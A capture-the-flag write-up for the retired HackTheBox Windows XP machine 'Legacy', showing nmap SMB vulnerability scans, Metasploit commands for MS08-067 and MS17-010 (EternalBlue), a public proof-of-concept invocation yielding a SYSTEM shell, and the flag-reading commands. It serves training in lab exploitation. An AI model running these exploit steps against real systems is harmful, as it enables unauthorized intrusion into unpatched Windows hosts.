# HackTheBox — Legacy

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** Exploitation / MS08-067 / MS17-010  
**Status:** Retired  

---

## Summary

Legacy is a Windows XP machine vulnerable to two critical SMB exploits: MS08-067 (Netapi) and MS17-010 (EternalBlue). Either path drops a direct SYSTEM shell with no privilege escalation required. This is a great introductory Windows exploitation box.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/legacy 10.10.10.4
```

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
```

```bash
nmap --script smb-vuln* -p 445 10.10.10.4
```

```
| smb-vuln-ms08-067: VULNERABLE
| smb-vuln-ms17-010: VULNERABLE
```

Both vulnerabilities confirmed.

---

## Exploitation — Method 1: MS08-067

### CVE-2008-4250 — Windows Server Service RCE

MS08-067 exploits a buffer overflow in the Windows Server service (`netapi32.dll`) via an RPC call to the `NetPathCanonicalize` function.

**Metasploit:**

```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set LHOST 10.10.14.X
set target 0   # Windows XP SP3
run
```

**Manual (using the public PoC):**

```bash
python ms08_067_2018.py 10.10.10.4 6 445
# 6 = Windows XP SP3 English
```

---

## Exploitation — Method 2: MS17-010 (EternalBlue)

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.4
run
```

Both exploits land as `NT AUTHORITY\SYSTEM`.

---

## Flags

```cmd
# User flag (john's desktop)
type C:\Documents and Settings\john\Desktop\user.txt

# Root/Admin flag
type C:\Documents and Settings\Administrator\Desktop\root.txt
```

---

## Key Takeaways

- Windows XP is still encountered in legacy environments and CTFs — know MS08-067
- Always run `smb-vuln*` NSE scripts against Windows SMB ports
- MS08-067 targets 32-bit Windows; select the correct target OS in Metasploit
- Both MS08-067 and MS17-010 land as SYSTEM — no privesc needed
- Windows XP reached end-of-life in 2014 — unpatched systems are a critical security risk

---

## CVE References

- **CVE-2008-4250** — MS08-067 Windows Server Service RCE
- **CVE-2017-0144** — MS17-010 EternalBlue SMB RCE

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scan + SMB vuln detection |
| Metasploit | MS08-067 / MS17-010 exploitation |
